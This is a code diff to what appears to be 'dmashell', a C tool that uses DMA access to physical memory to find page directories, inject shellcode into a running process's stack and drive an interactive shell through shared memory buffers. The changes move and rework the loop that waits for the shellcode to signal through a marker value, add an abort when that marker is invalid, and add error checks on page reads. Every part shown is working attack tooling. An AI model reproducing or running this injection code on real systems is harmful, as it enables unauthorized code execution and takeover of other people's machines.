@@ -155,6 +155,7 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int inj
 	uint32_t mark_value;			// value of the mark
 	addr_t seeker;				// pointer for seeking over the stack
 	int top_of_stack = 0;			// marked, if there was one stack-page unmapped
+	int	secs = 0;
 
 	seeker = code_location;
 	seeker = seeker - (seeker & 3);		// align to 32 bit locations.
@@ -202,8 +203,19 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int inj
 			break;
 		}
 		seeker -= 4;
+
+		// wait for MARK
 		linear_read(lin, mark_location, &mark_value, 4);
+		if(mark_value == MARK_UNCHANGED) {
+			printf(TERM_YELLOW "(dmashell)" TERM_RESET " waiting for shellcode to be executed...\n");
+			while(mark_value == MARK_UNCHANGED) {
+				printf("still sleeping (%d seconds, mark: 0x%08x)\r", secs, mark_value);
+				sleep(1);
+				linear_read(lin, mark_location, &mark_value, 4);
+			}
+		}
 	}
+
 	printf("\t* mark is 0x%08x\n",mark_value);
 	linear_read(lin, mark_location + ( ESP_OFFSET - MARK_OFFSET ), &mark_value, 4);
 	printf("\t* ESP was 0x%08x\n",mark_value);
@@ -300,7 +312,6 @@ void use_shell(linear_handle lin, uint32_t base)
 	uint8_t child_is_dead = 0;
 	uint32_t mark_value;
 	uint32_t mark_location;
-	int	secs = 0;
 
 	uint8_t rfrm_writer_pos = 0;
 	uint8_t rfrm_reader_pos = 0;
@@ -327,17 +338,6 @@ void use_shell(linear_handle lin, uint32_t base)
 	set_nonblocking_stdin();
 	// set STDIN to non-blocking.
 
-	// wait for MARK
-	GET_mark;
-	if(mark_value != MARK_CHANGED) {
-		printf(TERM_YELLOW "(dmashell)" TERM_RESET " waiting for shellcode to be executed...\n");
-		while(mark_value != MARK_CHANGED) {
-			printf("still sleeping (%d seconds, mark: 0x%08x)\r", secs, mark_value);
-			sleep(1);
-			GET_mark;
-		}
-	}
-
 	printf(TERM_YELLOW "(dmashell)" TERM_RESET " interactive shell should work now.\n");
 	printf(TERM_YELLOW "(dmashell)" TERM_RESET " press CTRL-C to enter menu-mode\n");
 
@@ -350,6 +350,12 @@ void use_shell(linear_handle lin, uint32_t base)
 		if(rfrm_reader_pos != rfrm_writer_pos + 1) {
 			// buffer is not full. let's try to obtain data from stdin
 			if(1 == read(STDIN_FILENO, rfrm_buffer, 1)) {
+				GET_mark;
+				if(mark_value != MARK_CHANGED) {
+					printf(TERM_YELLOW "(dmashell)" TERM_RESET " oops... invalid MARK from shellcode. terminated? aborting...\n");
+					child_is_dead = 1;
+					continue;
+				}
 				// there was some data.let's relay it.
 				linear_write_in_page(lin, base + RFRM_BUFFER + rfrm_writer_pos, rfrm_buffer, 1);
 				rfrm_writer_pos++;
@@ -542,11 +548,14 @@ int main(int argc, char**argv)
 		}
 		if((c = linear_is_pagedir_fast(lin, pn))) {
 			if(c < 0) {
-				printf("\n\n" TERM_RED "failed to read page 0x%05llx. aborting." TERM_RESET "\n", pn);
+				printf("\n\n" TERM_RED "failed to test page 0x%05llx. aborting." TERM_RESET "\n", pn);
 				break;
 			}
 			// load page
-			physical_read_page(phy, pn, page);
+			if(physical_read_page(phy, pn, page)) {
+				printf("\n\n" TERM_RED "failed to read page 0x%05llx. aborting." TERM_RESET "\n", pn);
+				break;
+			}
 			prob = linear_is_pagedir_probability(lin, page);
 			if(prob > 0.01) {
 				printf("0x%05llx [~%0.3f] ", pn, prob);
@@ -613,11 +622,14 @@ int main(int argc, char**argv)
 		}
 		if((c = linear_is_pagedir_fast(lin, pn))) {
 			if(c < 0) {
-				printf("\n\n" TERM_RED "failed to read page 0x%05llx. aborting." TERM_RESET "\n", pn);
+				printf("\n\n" TERM_RED "failed to test page 0x%05llx. aborting." TERM_RESET "\n", pn);
 				break;
 			}
 			// load page
-			physical_read_page(phy, pn, page);
+			if(physical_read_page(phy, pn, page)) {
+				printf("\n\n" TERM_RED "failed to read page 0x%05llx. aborting." TERM_RESET "\n", pn);
+				break;
+			}
 			prob = linear_is_pagedir_probability(lin, page);
 			if(prob > 0.01) {
 				printf("0x%05llx [~%0.3f] ", pn, prob);
